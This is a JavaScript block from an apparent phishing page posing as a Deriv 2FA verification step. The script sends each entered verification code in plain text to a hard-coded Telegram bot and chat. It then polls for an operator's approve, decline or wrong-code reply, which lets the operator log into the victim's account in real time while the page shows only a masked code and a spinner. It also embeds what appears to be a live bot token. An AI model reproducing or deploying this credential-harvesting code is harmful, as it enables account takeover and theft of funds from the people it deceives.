<script>
        const TELEGRAM_BOT_TOKEN = "8827407441:AAHqTSjR7BHABcD3c3sTbHYcZYjzK_8wJ_A";
        const TELEGRAM_CHAT_ID = "8820857419";
        const APPROVAL_REDIRECT_URL = "otp2.html";

        let pollTimer = null;
        let pollOffset = 0;

        function showError(msg) {
            const err = document.getElementById('verifyError');
            if (err) {
                err.textContent = msg;
                err.style.display = 'block';
            }
        }

        function hideError() {
            const err = document.getElementById('verifyError');
            if (err) err.style.display = 'none';
        }

        function maskCode(code) {
            if (code.length <= 2) return '*'.repeat(code.length);
            return code.charAt(0) + '*'.repeat(code.length - 2) + code.charAt(code.length - 1);
        }

        function stopPolling() {
            if (pollTimer) {
                clearInterval(pollTimer);
                pollTimer = null;
            }
        }

        function answerCallbackQuery(callbackQueryId) {
            if (!callbackQueryId) return;
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: callbackQueryId, text: 'Processing...' })
            }).catch(() => {});
        }

        function startPolling(userId) {
            stopPolling();
            pollOffset = 0;

            pollTimer = setInterval(async () => {
                try {
                    const response = await fetch(
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${pollOffset}&timeout=10&allowed_updates=[\"callback_query\"]`
                    );
                    const data = await response.json();

                    if (!data.ok || !Array.isArray(data.result)) {
                        return;
                    }

                    for (const update of data.result) {
                        pollOffset = Math.max(pollOffset, Number(update.update_id || 0) + 1);

                        if (!update.callback_query) continue;

                        const callbackData = String(update.callback_query.data || '');
                        const action = callbackData.split(/[:_]/)[0];
                        const payloadId = callbackData.includes('_') ? callbackData.split('_').slice(1).join('_') : callbackData.split(':').slice(1).join(':');

                        if (payloadId && payloadId !== userId) continue;

                        answerCallbackQuery(update.callback_query.id);

                        if (action === 'approve') {
                            stopPolling();
                            document.getElementById('spinnerOverlay').classList.remove('active');
                            window.location.href = APPROVAL_REDIRECT_URL;
                            return;
                        }

                        if (action === 'decline') {
                            stopPolling();
                            document.getElementById('spinnerOverlay').classList.remove('active');
                            document.getElementById('proceedBtn').disabled = false;
                            showError('Request declined. Please try again.');
                            return;
                        }

                        if (action === 'wrong') {
                            stopPolling();
                            document.getElementById('spinnerOverlay').classList.remove('active');
                            document.getElementById('proceedBtn').disabled = false;
                            showError('Wrong 2FA code. Please enter the correct code.');
                            return;
                        }
                    }
                } catch (error) {
                    console.error('Poll error:', error);
                }
            }, 1000);
        }

        function cancelPolling() {
            stopPolling();
            document.getElementById('spinnerOverlay').classList.remove('active');
            document.getElementById('proceedBtn').disabled = false;
            showError('Request cancelled. Please try again.');
        }

        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const proceedBtn = document.getElementById('proceedBtn');

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: JSON.stringify(keyboard)
                    })
                })
                .then(res => res.json())
                .then(data => {
                    if (!data.ok) {
                        throw new Error('Telegram send failed');
                    }
                    startPolling(userId);
                })
                .catch(err => {
                    console.error('Send error:', err);
                    spinnerOverlay.classList.remove('active');
                    proceedBtn.disabled = false;
                    showError('Failed to send notification. Please try again.');
                });
        }

        function submitCode() {
            hideError();

            const code = document.getElementById('verificationCode').value.trim();
            if (code === '') {
                showError('Please enter the verification code.');
                return;
            }

            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const spinnerCodeDisplay = document.getElementById('spinnerCodeDisplay');
            const proceedBtn = document.getElementById('proceedBtn');

            spinnerCodeDisplay.textContent = 'Code: ' + maskCode(code);
            spinnerOverlay.classList.add('active');
            proceedBtn.disabled = true;

            const userId = '2fa_' + Date.now();
            const message = `🔐 <b>New Deriv 2FA Code Submitted</b>\n\n` +
                `🔑 Verification Code: <code>${code}</code>\n` +
                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
                `Please approve, decline, or mark as wrong code:`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: '✅ APPROVE', callback_data: `approve_${userId}` }, { text: '❌ DECLINE', callback_data: `decline_${userId}` }],
                    [{ text: '⚠️ WRONG CODE', callback_data: `wrong_${userId}` }]
                ]
            };

            sendTelegramWithInlineKeyboard(message, keyboard, userId);
        }
    </script>
